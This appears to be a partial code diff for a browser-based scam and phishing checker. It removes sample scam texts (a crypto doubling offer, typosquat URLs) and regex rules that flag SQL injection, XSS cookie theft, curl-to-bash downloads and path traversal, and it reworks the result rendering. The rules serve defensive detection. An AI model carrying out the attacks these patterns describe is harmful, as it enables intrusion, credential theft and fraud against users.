-Send 0.5 BTC to the address below to receive 1.0 BTC back within 24 hours — guaranteed returns, risk-free investment opportunity backed by our platform.
-
-wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh`,
-
-  typosquat: `Quick heads up — sign in here to check your shipment: http://www.googel.com/accounts/login
-Also got this one from "support": http://paypa1.com/resolve-case`
-};
-
-const RULES = [
-  {cat:"Social Engineering / Phishing", label:"Account suspension / closure threat", sev:"high", re:/\b(suspend(ed)?|clos(e|ure)|terminat(e|ed))\b.{0,40}\b(account|access)\b/i, desc:"Threatens account suspension or closure — classic urgency pressure to short-circuit careful thinking."},
-  {cat:"Social Engineering / Phishing", label:"Urgency / time-pressure language", sev:"high", re:/\b(within\s+\d+\s*(hours?|hrs?|days?)|act\s+now|immediately|urgent(ly)?)\b/i, desc:"Artificial time pressure. Legitimate institutions rarely demand split-second action."},
-  {cat:"Social Engineering / Phishing", label:"Generic greeting", sev:"med", re:/\bdear\s+(customer|user|member|valued)\b/i, desc:"Generic greeting instead of your actual name — a sign of a mass-sent message, not a personal one from your real provider."},
-  {cat:"Social Engineering / Phishing", label:"Credential or sensitive-data request", sev:"high", re:/\b(verify|confirm|update)\b.{0,30}\b(password|account details|identity|ssn|social security|card number|pin)\b/i, desc:"Asks you to submit credentials or sensitive data directly — legitimate services don't request this via email link."},
-  {cat:"Social Engineering / Phishing", label:"Payment / gift-card urgency (BEC)", sev:"med", re:/\bwire\s+transfer|gift\s*cards?\b.{0,30}\b(urgent|now|today|asap)\b/i, desc:"Payment request paired with urgency — a common pattern in CEO-fraud / business email compromise."},
-
-  {cat:"Malicious URL Pattern", label:"Raw IP address as host", sev:"high", re:/https?:\/\/(\d{1,3}\.){3}\d{1,3}/i, desc:"Raw IP address used instead of a domain name — hides the actual destination and skips normal domain reputation checks."},
-  {cat:"Malicious URL Pattern", label:"Punycode / homograph encoding", sev:"high", re:/xn--[a-z0-9]+/i, desc:"Punycode encoding — often used to render lookalike characters that visually mimic a trusted domain (a homograph attack)."},
-  {cat:"Malicious URL Pattern", label:"URL shortener", sev:"med", re:/\b(bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|ow\.ly)\b/i, desc:"URL shortener — hides the real destination until after you've already clicked."},
-  {cat:"Malicious URL Pattern", label:"Brand name + suspicious TLD", sev:"high", re:/\b(paypa1|paypal|amaz0n|amazon|g00gle|google|micros0ft|microsoft|apple|bank)[\-.][a-z0-9\-]*\.(xyz|top|click|info|support|win|gq)\b/i, desc:"Brand name combined with an unrelated domain and a cheap, high-abuse TLD — a classic typosquat / lookalike domain."},
-  {cat:"Malicious URL Pattern", label:"Excessive subdomain chaining", sev:"med", re:/(?:[a-z0-9\-]+\.){4,}[a-z]{2,}/i, desc:"Excessive subdomain chaining — sometimes used to bury the real domain deep in the URL where it's easy to miss."},
-  {cat:"Malicious URL Pattern", label:"Typosquat domain (lookalike of a known brand)", sev:"high", re:null, desc:""},
-
-  {cat:"Code Injection (Web/Command)", label:"SQL tautology (OR 1=1)", sev:"high", re:/\bOR\s+['"]?1['"]?\s*=\s*['"]?1['"]?/i, desc:"Classic SQL injection tautology — makes a WHERE clause always evaluate true, bypassing authentication logic."},
-  {cat:"Code Injection (Web/Command)", label:"SQL UNION SELECT", sev:"high", re:/\bUNION\s+SELECT\b/i, desc:"SQL UNION-based injection — used to pull extra data out of a database via a manipulated query."},
-  {cat:"Code Injection (Web/Command)", label:"SQL comment terminator", sev:"med", re:/--\s*$/m, desc:"SQL comment terminator — used to cut off the rest of a legitimate query after an injected clause."},
-  {cat:"Code Injection (Web/Command)", label:"Inline <script> tag", sev:"high", re:/<script[\s>]/i, desc:"Inline &lt;script&gt; tag — the core building block of a cross-site scripting (XSS) payload."},
-  {cat:"Code Injection (Web/Command)", label:"document.cookie access", sev:"high", re:/document\.cookie/i, desc:"Reads the browser's cookies — commonly used in XSS payloads to steal session tokens."},
-  {cat:"Code Injection (Web/Command)", label:"Download-and-execute pattern", sev:"high", re:/curl\s+.+\|\s*bash|wget\s+.+&&\s*chmod/i, desc:"Download-and-execute pattern — fetches a remote script and runs it immediately, a hallmark of malware droppers."},
-  {cat:"Code Injection (Web/Command)", label:"Inline event-handler attribute", sev:"med", re:/on(error|load|click)\s*=/i, desc:"Inline event-handler attribute — a common vector for smuggling script execution into HTML that looks otherwise harmless."},
-  {cat:"Code Injection (Web/Command)", label:"Base64 decode-and-execute", sev:"med", re:/eval\s*\(\s*(atob|base64_decode)/i, desc:"Decodes a base64 blob and immediately executes it — a common way to hide a malicious payload from casual reading."},
-  {cat:"Code Injection (Web/Command)", label:"Path traversal sequence", sev:"med", re:/(\.\.\/){2,}/, desc:"Path traversal sequence — attempts to escape a web root or restricted folder to reach files like system configs or credentials."},
-
-  {cat:"Malware / Scareware", label:"Fake infection alert", sev:"high", re:/your (computer|device|pc) (is|has been) (infected|compromised|hacked)/i, desc:"Scareware language claiming your device is infected — designed to panic you into calling a number or installing 'cleanup' software that is itself malicious."},
-  {cat:"Malware / Scareware", label:"Push to call a phone number", sev:"med", re:/call\s+(this\s+number|us)\s+immediately|toll[- ]free\s+support/i, desc:"Pushes you toward a phone number instead of an official support channel — a staple of fake tech-support scams."},
-  {cat:"Malware / Scareware", label:"Double file extension", sev:"high", re:/double[- ]?extension|\.pdf\.exe|\.docx?\.exe|\.jpg\.exe/i, desc:"Double file extension trick (e.g. invoice.pdf.exe) — disguises an executable as a harmless document or image."},
-  {cat:"Malware / Scareware", label:"Disable antivirus / firewall instruction", sev:"med", re:/disable\s+(your\s+)?(antivirus|windows defender|firewall)/i, desc:"Instructs the target to turn off security software — a strong signal the next step is installing something malicious."},
-
-  {cat:"Crypto & Financial Scam", label:"Send-to-receive-more crypto scheme", sev:"high", re:/send\s+.{0,15}(btc|bitcoin|eth|crypto|usdt)\b.{0,40}\b(receive|get back|double)\b/i, desc:"'Send crypto to receive more back' — a textbook advance-fee crypto scam with no legitimate equivalent."},
-  {cat:"Crypto & Financial Scam", label:"Guaranteed / risk-free returns claim", sev:"med", re:/guaranteed\s+(returns?|profit)|risk[- ]free\s+investment/i, desc:"Promises guaranteed or risk-free returns — a claim no legitimate investment can honestly make."},
-  {cat:"Crypto & Financial Scam", label:"Unsolicited prize / reward claim", sev:"med", re:/(claim|redeem)\s+your\s+(prize|reward|winnings)/i, desc:"Unsolicited prize or reward claim — used to lure victims into paying a 'release fee' or handing over financial details."},
-];
-
-const KNOWN_BRAND_DOMAINS = [
-  "google.com","paypal.com","amazon.com","microsoft.com","apple.com",
-  "facebook.com","instagram.com","netflix.com","linkedin.com","github.com",
-  "dropbox.com","bankofamerica.com","chase.com","wellsfargo.com",
-  "outlook.com","yahoo.com","twitter.com"
-];
-
-function levenshtein(a, b){
-  const m = a.length, n = b.length;
-  const dp = Array.from({length: m+1}, () => new Array(n+1).fill(0));
-  for(let i=0;i<=m;i++) dp[i][0] = i;
-  for(let j=0;j<=n;j++) dp[0][j] = j;
-  for(let i=1;i<=m;i++){
-    for(let j=1;j<=n;j++){
-      dp[i][j] = a[i-1] === b[j-1] ? dp[i-1][j-1] : 1 + Math.min(dp[i-1][j-1], dp[i-1][j], dp[i][j-1]);
-    }
-  }
-  return dp[m][n];
-}
-
-function detectTyposquats(text){
-  const domainRe = /\b(?:https?:\/\/)?(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/gi;
-  const found = [];
-  let m;
-  while((m = domainRe.exec(text)) !== null){
-    const fullMatch = m[0];
-    const domain = m[1].toLowerCase();
-    const parts = domain.split('.');
-    const candidate = parts.slice(-2).join('.');
-    if(KNOWN_BRAND_DOMAINS.includes(candidate)) continue;
-    for(const brand of KNOWN_BRAND_DOMAINS){
-      const dist = levenshtein(candidate, brand);
-      if(dist > 0 && dist <= 2 && Math.abs(candidate.length - brand.length) <= 2){
-        const descTemplate = currentLang === 'hi'
-          ? `"${candidate}" असली "${brand}" से केवल ${dist} अक्षर अलग है — यह एक क्लासिक टाइपोस्क्वैट है जो गलती से टाइप किए गए यूआरएल या सरसरी निगाह को फँसाने के लिए बनाया गया है।`
-          : `"${candidate}" is only ${dist} character${dist>1?'s':''} different from the real "${brand}" — a classic typosquat built to catch mistyped URLs or a quick glance.`;
-        found.push({
-          start: m.index, end: m.index + fullMatch.length, text: fullMatch,
-          cat: "Malicious URL Pattern",
-          label: "Typosquat domain (lookalike of a known brand)",
-          sev: "high", desc: descTemplate
-        });
-        break;
-      }
-    }
-  }
-  return found;
-}
-
-function analyze(text){
-  let matches = [];
-  RULES.forEach(rule => {
-    if(!rule.re) return;
-    let re = new RegExp(rule.re.source, rule.re.flags.includes('g') ? rule.re.flags : rule.re.flags + 'g');
-    let m;
-    while((m = re.exec(text)) !== null){
-      matches.push({start:m.index, end:m.index + m[0].length, text:m[0], ...rule});
-      if(m.index === re.lastIndex) re.lastIndex++;
-    }
-  });
-  matches = matches.concat(detectTyposquats(text));
-
-  matches.sort((a,b) => a.start - b.start || (a.sev==='high'?-1:1));
-  let filtered = [];
-  let lastEnd = -1;
-  matches.forEach(m => {
-    if(m.start >= lastEnd){ filtered.push(m); lastEnd = m.end; }
-  });
-  return filtered;
-}
-
-const ALL_CHECKS = (() => {
-  const seen = new Set();
-  const checks = [];
-  RULES.forEach(r => {
-    const key = r.cat + '::' + r.label;
-    if(!seen.has(key)){ seen.add(key); checks.push({cat:r.cat, label:r.label, sev:r.sev}); }
-  });
-  return checks;
-})();
-
-function computeRiskScore(matches){
-  if(matches.length === 0) return 0;
-  let score = 0;
-  matches.forEach(m => { score += m.sev === 'high' ? 22 : 11; });
-  const cats = new Set(matches.map(m => m.cat)).size;
-  score += (cats - 1) * 10;
-  return Math.max(4, Math.min(100, Math.round(score)));
-}
-
-function verdictTier(score){
-  if(score === 0) return 'safe';
-  if(score < 50) return 'caution';
-  return 'flagged';
-}
-
-function escapeHtml(s){
-  return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-}
-
-function buildSummary(matches, score, aiResult){
-  if(matches.length === 0 && !aiResult){
-    return t('summarySafeNoMatches');
-  }
-  if(matches.length === 0 && aiResult){
-    return aiResult.reasoning;
-  }
-  const catCounts = {};
-  matches.forEach(m => { catCounts[m.cat] = (catCounts[m.cat]||0) + 1; });
-  const cats = Object.keys(catCounts);
-  const phrases = t('catPhrases');
-  const clauses = cats.map(c => phrases[c] || c.toLowerCase());
-  let clauseText;
-  if(clauses.length === 1) clauseText = clauses[0];
-  else if(clauses.length === 2) clauseText = clauses[0] + t('joinTwo') + clauses[1];
-  else clauseText = clauses.slice(0,-1).join(", ") + t('joinLast') + clauses[clauses.length-1];
-
-  const highCount = matches.filter(m => m.sev==='high').length;
-  const severityNote = highCount > 0 ? t('highSeverityNote')(highCount, matches.length) : t('modSeverityNote');
-
-  return `${t('summaryPrefix')} ${clauseText}. ${severityNote}`;
-}
-
-function iconForTier(tier){
-  if(tier === 'safe') return ICONS.shieldCheck;
-  if(tier === 'flagged') return ICONS.shieldX;
-  if(tier === 'pending') return ICONS.shieldScan;
-  return ICONS.shieldAlert;
-}
-function labelForTier(tier){
-  if(tier === 'safe') return t('verdictSafe');
-  if(tier === 'flagged') return t('verdictFlagged');
-  if(tier === 'pending') return t('verdictPending');
-  return t('verdictCaution');
-}
-
-function scoreRing(score, tier){
-  const r = 30, c = 2 * Math.PI * r;
-  const pct = score / 100;
-  const colorVar = tier === 'safe' ? 'var(--safe)' : tier === 'flagged' ? 'var(--danger)' : 'var(--caution)';
-  return `
-    <div class="score-ring-block">
-      <svg class="score-ring" width="76" height="76" viewBox="0 0 76 76">
-        <circle class="track" cx="38" cy="38" r="${r}" fill="none" stroke-width="7"/>
-        <circle class="fill" cx="38" cy="38" r="${r}" fill="none" stroke="${colorVar}" stroke-width="7"
-          stroke-dasharray="${c}" stroke-dashoffset="${c}" transform="rotate(-90 38 38)" data-target="${c * (1-pct)}"/>
-      </svg>
-      <div>
-        <div class="score-num" style="color:${colorVar}">${score}/100</div>
-        <div class="score-label">${t('riskScore')}</div>
-      </div>
-    </div>
-  `;
-}
-
-function renderVerdictArea(state){
+/* ==========================================================================
+   Rendering
+   ========================================================================== */
+function renderVerdictArea(state, isFreshResult){
   const wrap = document.getElementById('results-wrap');
-  let html = '';
 
   if(state.status === 'pending'){
-    html += `
+    wrap.innerHTML = `
     <div class="verdict-card reveal reveal-1">
       <div class="verdict-icon-wrap pending">${iconForTier('pending')}</div>
       <div class="verdict-label pending">${t('verdictPending')}</div>
     </div>
     <div class="assistant-bubble reveal reveal-2">
-      <div class="assistant-avatar">${AI_FACE_ICONS.thinking}</div>
+      <div class="assistant-avatar"><span class="assistant-avatar-ring"></span>${AI_FACE_ICONS.thinking}</div>
       <div class="assistant-text">
         <p class="assistant-line" id="assistant-line"><span class="assistant-cursor"></span></p>
         <div class="scan-timeline" id="scan-timeline"></div>
       </div>
     </div>`;
-    wrap.innerHTML = html;
     runScanNarration();
     return;
   }
 
-  const finalScore = state.aiResult ? Math.max(state.heuristicScore, state.aiResult.risk_score) : state.heuristicScore;
+  const heuristicTier = verdictTier(state.heuristicScore);
+  const aiScore = state.aiResult ? state.aiResult.risk_score : null;
+  const finalScore = aiScore !== null ? Math.max(state.heuristicScore, aiScore) : state.heuristicScore;
   const tier = verdictTier(finalScore);
-  narrationRunToken++; // stop any in-flight narration loop
+  const disagreement = aiScore !== null && verdictTier(aiScore) !== heuristicTier && aiScore > state.heuristicScore;
+  narrationRunToken++; // stop any in-flight pending narration loop
 
   let errorHtml = '';
   if(state.aiError){
@@ -1564,33 +1169,33 @@ function renderVerdictArea(state){
   const n = NARRATION[currentLang] || NARRATION.en;
   const closingLine = tier === 'safe' ? n.verdictSafe : tier === 'flagged' ? n.verdictFlagged : n.verdictCaution;
 
-  html += `
-    <div class="verdict-card reveal reveal-1">
+  wrap.innerHTML = `
+    <div class="verdict-card reveal reveal-1 tilt-card">
       <div class="verdict-icon-wrap ${tier} animate-pop">${iconForTier(tier)}</div>
       <div class="verdict-label ${tier}">${labelForTier(tier)}</div>
-      <p class="verdict-summary">${buildSummary(currentMatches, state.heuristicScore, state.aiResult)}</p>
+      <p class="verdict-summary">${buildSummary(currentMatches, state.aiResult)}</p>
       <div class="score-row">
         ${scoreRing(finalScore, tier)}
         <div class="source-pills">
           <span class="source-pill">${t('patternScan')}: <b>${state.heuristicScore}/100</b></span>
-          <span class="source-pill">${t('aiAnalystLabel')}: <b>${state.aiResult ? state.aiResult.risk_score + '/100' : '—'}</b></span>
+          <span class="source-pill">${t('aiAnalystLabel')}: <b>${aiScore !== null ? aiScore + '/100' : '—'}</b></span>
         </div>
       </div>
+      ${disagreement ? `<div class="disagree-note">${t('disagreeNote')}</div>` : ''}
       ${errorHtml}
     </div>
     <div class="assistant-bubble reveal reveal-2">
       <div class="assistant-avatar">${AI_FACE_ICONS[tier] || AI_FACE_ICONS.caution}</div>
       <div class="assistant-text" style="display:flex; align-items:center; justify-content:space-between; gap:10px;">
         <p class="assistant-line" style="margin:0;">${escapeHtml(closingLine)}</p>
-        <button class="voice-btn" id="voice-btn" title="Read this aloud" aria-label="Read this aloud">
+        <button class="voice-btn" id="voice-btn" title="Read this aloud" aria-label="Read this aloud" style="flex:none; width:34px; height:34px; border-radius:50%; border:1px solid var(--border); background:var(--surface); color:var(--brand); cursor:pointer; display:flex; align-items:center; justify-content:center;">
           <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2 6 H4.5 L8 3 V13 L4.5 10 H2 Z" fill="currentColor"/><path d="M10.5 5 C11.5 6 11.5 10 10.5 11" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
         </button>
       </div>
     </div>
   `;
 
-  wrap.innerHTML = html;
-  setMood(tier);
+  setMood(tier, !!isFreshResult);
 
   requestAnimationFrame(() => {
     const ringFill = wrap.querySelector('.score-ring .fill');
@@ -1606,7 +1211,7 @@ function renderVerdictArea(state){
     voiceBtn.addEventListener('click', () => {
       if(!('speechSynthesis' in window)) return;
       if(window.speechSynthesis.speaking){ window.speechSynthesis.cancel(); voiceBtn.classList.remove('speaking'); return; }
-      const summary = closingLine + ' ' + buildSummary(currentMatches, state.heuristicScore, state.aiResult).replace(/<[^>]+>/g,'');
+      const summary = closingLine + ' ' + buildSummary(currentMatches, state.aiResult).replace(/<[^>]+>/g,'');
       const utter = new SpeechSynthesisUtterance(summary);
       utter.lang = currentLang === 'hi' ? 'hi-IN' : 'en-US';
       utter.onend = () => voiceBtn.classList.remove('speaking');
@@ -1616,6 +1221,7 @@ function renderVerdictArea(state){
   }
 
   renderRestSections(state);
+  initTiltFor(wrap.querySelectorAll('.tilt-card'));
 }
 
 function renderRestSections(state){
@@ -1638,15 +1244,16 @@ function renderRestSections(state){
       <div class="section-body"><div class="evidence-block">${evHtml || '<span style="color:var(--ink-faint)">(empty)</span>'}</div></div>
     </div>`;
 
+  const aiFlaggedDespiteNoMatches = currentMatches.length === 0 && state.aiResult && state.aiResult.risk_score >= 30;
   let findingsInner;
   if(currentMatches.length === 0){
-    findingsInner = `<p class="no-findings">${t('nothingFound')}</p>`;
+    findingsInner = `<p class="no-findings${aiFlaggedDespiteNoMatches ? ' has-ai-flag' : ''}">${aiFlaggedDespiteNoMatches ? t('nothingFoundButAiFlagged') : t('nothingFound')}</p>`;
   } else {
     findingsInner = `<div class="findings-list">` + currentMatches.map(m => `
       <div class="finding sev-${m.sev==='high'?'high':'med'}">
         <div class="finding-icon">${m.sev==='high' ? ICONS.x : ICONS.check}</div>
         <div>
-          <div class="finding-cat">${m.cat}</div>
+          <div class="finding-cat">${CAT_NAMES[currentLang][m.cat]}</div>
           <p class="finding-desc"><span class="finding-match">${escapeHtml(m.text)}</span> — ${m.desc}</p>
         </div>
       </div>
@@ -1689,16 +1296,16 @@ function renderRestSections(state){
       <div class="section-body">${aiInner}</div>
     </div>`;
 
-  const matchedLabels = new Set(currentMatches.map(m => m.label));
+  const matchedKeys = new Set(currentMatches.map(m => m.key));
   const grouped = {};
-  ALL_CHECKS.forEach(chk => {
-    grouped[chk.cat] = grouped[chk.cat] || [];
-    grouped[chk.cat].push({...chk, hit: matchedLabels.has(chk.label)});
+  CAT_ORDER.forEach(cat => { grouped[cat] = []; });
+  RULES.forEach(rule => {
+    grouped[rule.cat].push({key:rule.key, sev:rule.sev, label: rule[currentLang].label, hit: matchedKeys.has(rule.key)});
   });
-  const checklistBody = Object.entries(grouped).map(([cat, checks]) => `
+  const checklistBody = CAT_ORDER.map(cat => `
     <div class="checklist-group">
-      <div class="checklist-group-name">${cat}</div>
-      ${checks.map(c => `
+      <div class="checklist-group-name">${CAT_NAMES[currentLang][cat]}</div>
+      ${grouped[cat].map(c => `
         <div class="checklist-row ${c.hit ? 'fail':''}">
           <span class="check-icon ${c.hit ? ('fail-'+c.sev) : 'pass'}">${c.hit ? ICONS.x : ICONS.check}</span>
           <span>${c.label}</span>
@@ -1718,10 +1325,7 @@ function renderRestSections(state){
       <div class="checklist-panel" id="checklist-panel"><div class="checklist-inner">${checklistBody}</div></div>
     </div>`;
 
-  const vizSection = buildVizSection(state);
-  const chatSection = buildChatSection();
-
-  wrap.insertAdjacentHTML('beforeend', evidenceSection + findingsSection + aiSection + checklistSection + vizSection + chatSection);
+  wrap.insertAdjacentHTML('beforeend', evidenceSection + findingsSection + aiSection + checklistSection);
 
   const toggleBtn = document.getElementById('checklist-toggle');
   const panel = document.getElementById('checklist-panel');
@@ -1729,350 +1333,41 @@ function renderRestSections(state){
     const open = panel.classList.toggle('open');
     toggleBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
   });
-
-  initVizTabs(state);
-  initChat(state);
 }
 
-/* ============================================================
-   Visual breakdown — gauge, radar, threat graph, domain tree, probability bars
-   ============================================================ */
-const VIZ_TABS = [
-  {id:'gauge', label:'Speedometer'},
-  {id:'radar', label:'Confidence radar'},
-  {id:'graph', label:'Threat network'},
-  {id:'tree', label:'Domain tree'},
-  {id:'prob', label:'Category odds'},
-];
-
-function buildVizSection(){
-  return `
-    <div class="section reveal reveal-4">
-      <div class="section-head">${ICONS.sparkle}
-        <div><div class="section-title">Visual breakdown</div><div class="section-sub">The same result, a few different ways</div></div>
-      </div>
-      <div class="section-body">
-        <div class="mode-tabs" id="viz-tabs">
-          ${VIZ_TABS.map((v,i) => `<button class="mode-tab viz-tab ${i===0?'active':''}" data-viz="${v.id}">${v.label}</button>`).join('')}
-        </div>
-        <div id="viz-canvas" style="display:flex; justify-content:center; padding:10px 0;"></div>
-      </div>
-    </div>`;
-}
-
-function gaugeSVG(score, tier){
-  const colorVar = tier === 'safe' ? 'var(--safe)' : tier === 'flagged' ? 'var(--danger)' : 'var(--caution)';
-  const angle = -90 + (score/100)*180;
-  const rad = (angle * Math.PI)/180;
-  const nx = 60 + 42*Math.cos(rad), ny = 60 + 42*Math.sin(rad);
-  return `
-  <svg width="200" height="130" viewBox="0 0 120 75">
-    <path d="M12 65 A48 48 0 0 1 108 65" fill="none" stroke="var(--border)" stroke-width="9" stroke-linecap="round"/>
-    <path d="M12 65 A48 48 0 0 1 108 65" fill="none" stroke="${colorVar}" stroke-width="9" stroke-linecap="round"
-      stroke-dasharray="${Math.PI*48}" stroke-dashoffset="${Math.PI*48*(1-score/100)}"/>
-    <line class="gauge-needle" x1="60" y1="65" x2="${nx}" y2="${ny}" stroke="var(--ink)" stroke-width="2.5" stroke-linecap="round" transform="rotate(0 60 65)"/>
-    <circle cx="60" cy="65" r="4" fill="var(--ink)"/>
-    <text x="60" y="55" text-anchor="middle" font-family="Sora, sans-serif" font-weight="700" font-size="16" fill="${colorVar}">${score}</text>
-  </svg>`;
-}
-
-function radarSVG(matches, aiResult){
-  const cats = ["Social Engineering / Phishing","Malicious URL Pattern","Code Injection (Web/Command)","Malware / Scareware","Crypto & Financial Scam"];
-  const shortLabels = ["Phishing","URL","Code","Malware","Crypto"];
-  const n = cats.length;
-  const cx=90, cy=85, R=60;
-  const values = cats.map(c => {
-    const hits = matches.filter(m => m.cat === c);
-    if(hits.length === 0) return 0.08;
-    const highs = hits.filter(m=>m.sev==='high').length;
-    return Math.min(1, 0.35 + highs*0.35 + (hits.length-highs)*0.15);
-  });
-  const pts = values.map((v,i) => {
-    const ang = -Math.PI/2 + i*(2*Math.PI/n);
-    return [cx + R*v*Math.cos(ang), cy + R*v*Math.sin(ang)];
-  });
-  const gridRings = [0.33,0.66,1].map(f => {
-    const p = Array.from({length:n}, (_,i) => {
-      const ang = -Math.PI/2 + i*(2*Math.PI/n);
-      return `${cx + R*f*Math.cos(ang)},${cy + R*f*Math.sin(ang)}`;
-    }).join(' ');
-    return `<polygon points="${p}" fill="none" stroke="var(--border)" stroke-width="1"/>`;
-  }).join('');
-  const labels = shortLabels.map((l,i) => {
-    const ang = -Math.PI/2 + i*(2*Math.PI/n);
-    const lx = cx + (R+16)*Math.cos(ang), ly = cy + (R+16)*Math.sin(ang);
-    return `<text x="${lx}" y="${ly}" text-anchor="middle" class="graph-node-label">${l}</text>`;
-  }).join('');
-  const poly = pts.map(p=>p.join(',')).join(' ');
-  return `
-  <svg width="220" height="200" viewBox="0 0 180 175">
-    ${gridRings}
-    <polygon class="radar-fill" points="${poly}" fill="rgba(14,124,107,0.25)" stroke="var(--brand)" stroke-width="2"/>
-    ${labels}
-  </svg>`;
-}
-
-function threatGraphSVG(matches){
-  const cats = [...new Set(matches.map(m=>m.cat))];
-  if(cats.length === 0){
-    return `<svg width="240" height="120" viewBox="0 0 240 120"><circle cx="120" cy="60" r="28" fill="var(--safe-light)" stroke="var(--safe)" stroke-width="1.6"/><text x="120" y="64" text-anchor="middle" class="graph-node-label" fill="var(--safe)">Clear</text></svg>`;
-  }
-  const cx=120, cy=60, R=44;
-  const nodes = cats.map((c,i) => {
-    const ang = -Math.PI/2 + i*(2*Math.PI/cats.length);
-    return {x: cx+R*Math.cos(ang), y: cy+R*Math.sin(ang), label: c.split(' ')[0]};
-  });
-  const edges = nodes.map(n => `<line class="graph-edge hot" x1="${cx}" y1="${cy}" x2="${n.x}" y2="${n.y}"/>`).join('');
-  const nodeDots = nodes.map(n => `<circle cx="${n.x}" cy="${n.y}" r="20" fill="var(--danger-light)" stroke="var(--danger)" stroke-width="1.4"/><text x="${n.x}" y="${n.y+3}" text-anchor="middle" class="graph-node-label">${n.label}</text>`).join('');
-  return `
-  <svg width="260" height="140" viewBox="0 0 240 120">
-    ${edges}
-    <circle cx="${cx}" cy="${cy}" r="22" fill="var(--danger)" stroke="var(--danger)" stroke-width="1.4"/>
-    <text x="${cx}" y="${cy+4}" text-anchor="middle" class="graph-node-label" fill="#fff">Risk</text>
-    ${nodeDots}
-  </svg>`;
-}
-
-function domainTreeSVG(text){
-  const m = text.match(/\b(?:https?:\/\/)?(?:www\.)?([a-z0-9-]+(?:\.[a-z0-9-]+)+)\b/i);
-  if(!m) return `<p style="font-size:13px; color:var(--ink-faint);">No link found to break down.</p>`;
-  const parts = m[1].split('.').reverse();
-  const rowH = 34;
-  const rows = parts.map((p,i) => {
-    const isRoot = i === parts.length-1 || i === parts.length-2;
-    return `<div style="display:flex; align-items:center; gap:8px; margin-left:${i*22}px;">
-      <div style="width:8px;height:8px;border-radius:50%;background:${isRoot?'var(--safe)':'var(--danger)'};"></div>
-      <span style="font-family:'JetBrains Mono',monospace; font-size:13px; color:${isRoot?'var(--ink)':'var(--danger)'}; font-weight:${isRoot?600:500};">${escapeHtml(p)}</span>
-      ${i===0?'<span style="font-size:11px;color:var(--ink-faint);">(top-level)</span>':''}
-    </div>`;
-  }).join('<div style="margin-left:8px;color:var(--ink-faint);font-size:11px;">↓</div>');
-  return `<div style="display:flex;flex-direction:column;gap:4px;">${rows}</div>`;
-}
-
-function probBarsHTML(matches, aiResult){
-  const catToBucket = {
-    "Social Engineering / Phishing": "Phishing",
-    "Malicious URL Pattern": "Phishing",
-    "Code Injection (Web/Command)": "Malware",
-    "Malware / Scareware": "Malware",
-    "Crypto & Financial Scam": "Scam",
-  };
-  const buckets = {Phishing:0, Malware:0, Scam:0};
-  matches.forEach(m => {
-    const b = catToBucket[m.cat];
-    if(b) buckets[b] += m.sev === 'high' ? 30 : 15;
-  });
-  if(aiResult){
-    const cat = (aiResult.category || '').toLowerCase();
-    const boost = Math.round((aiResult.risk_score||0) * 0.5);
-    if(cat.includes('phish')) buckets.Phishing += boost;
-    else if(cat.includes('malware') || cat.includes('code')) buckets.Malware += boost;
-    else buckets.Scam += boost;
-  }
-  Object.keys(buckets).forEach(k => buckets[k] = Math.min(100, buckets[k]));
-  const colors = {Phishing:'var(--danger)', Malware:'var(--caution)', Scam:'#8B5CF6'};
-  return Object.entries(buckets).map(([k,v]) => `
-    <div class="prob-row">
-      <span class="prob-label">${k}</span>
-      <div class="prob-track"><div class="prob-fill" style="background:${colors[k]}; width:${v}%;"></div></div>
-      <span class="prob-pct">${v}%</span>
-    </div>
-  `).join('');
-}
-
-function initVizTabs(state){
-  const tabsEl = document.getElementById('viz-tabs');
-  const canvasEl = document.getElementById('viz-canvas');
-  if(!tabsEl) return;
-  const finalScore = state.aiResult ? Math.max(state.heuristicScore, state.aiResult.risk_score) : state.heuristicScore;
-  const tier = verdictTier(finalScore);
-
-  function render(id){
-    if(id === 'gauge') canvasEl.innerHTML = gaugeSVG(finalScore, tier);
-    else if(id === 'radar') canvasEl.innerHTML = radarSVG(currentMatches, state.aiResult);
-    else if(id === 'graph') canvasEl.innerHTML = threatGraphSVG(currentMatches);
-    else if(id === 'tree') canvasEl.innerHTML = domainTreeSVG(currentEvidenceText);
-    else if(id === 'prob') canvasEl.innerHTML = `<div style="width:100%; max-width:320px;">${probBarsHTML(currentMatches, state.aiResult)}</div>`;
-    requestAnimationFrame(() => {
-      const gn = canvasEl.querySelector('.gauge-needle');
-      if(gn){
-        const angle = -90 + (finalScore/100)*180;
-        gn.style.transform = `rotate(${angle+90}deg)`;
-      }
-    });
-  }
-  tabsEl.querySelectorAll('.viz-tab').forEach(tab => {
-    tab.addEventListener('click', () => {
-      tabsEl.querySelectorAll('.viz-tab').forEach(x=>x.classList.remove('active'));
-      tab.classList.add('active');
-      render(tab.dataset.viz);
-    });
-  });
-  render('gauge');
-}
-
-/* ============================================================
-   AI chat mode — "Ask why" follow-up conversation
-   ============================================================ */
-function buildChatSection(){
-  return `
-    <div class="section reveal reveal-4">
-      <div class="section-head">${ICONS.sparkle}
-        <div><div class="section-title">Ask the AI about this result</div><div class="section-sub">No page reload — a real follow-up conversation</div></div>
-      </div>
-      <div class="section-body">
-        <div class="chat-panel" id="chat-panel">
-          <div class="chat-suggestions" id="chat-suggestions"></div>
-          <div class="chat-log" id="chat-log"></div>
-          <div class="chat-input-row">
-            <input type="text" id="chat-input" placeholder="Ask anything about this result…">
-            <button id="chat-send">Send</button>
-          </div>
-        </div>
-      </div>
-    </div>`;
-}
-
-function initChat(state){
-  const suggEl = document.getElementById('chat-suggestions');
-  const logEl = document.getElementById('chat-log');
-  const inputEl = document.getElementById('chat-input');
-  const sendBtn = document.getElementById('chat-send');
-  if(!suggEl) return;
-
-  chatHistory = [];
-  logEl.innerHTML = '';
-  const suggestions = currentMatches.length
-    ? ["Why is this dangerous?", "What should I do next?", "Explain it like I'm five"]
-    : ["Could this still be a scam?", "What should I double-check?"];
-  suggEl.innerHTML = suggestions.map(s => `<button class="chip" data-q="${escapeHtml(s)}">${escapeHtml(s)}</button>`).join('');
-  suggEl.querySelectorAll('.chip').forEach(c => c.addEventListener('click', () => sendChat(c.dataset.q, state)));
-
-  sendBtn.addEventListener('click', () => {
-    const q = inputEl.value.trim();
-    if(!q) return;
-    inputEl.value = '';
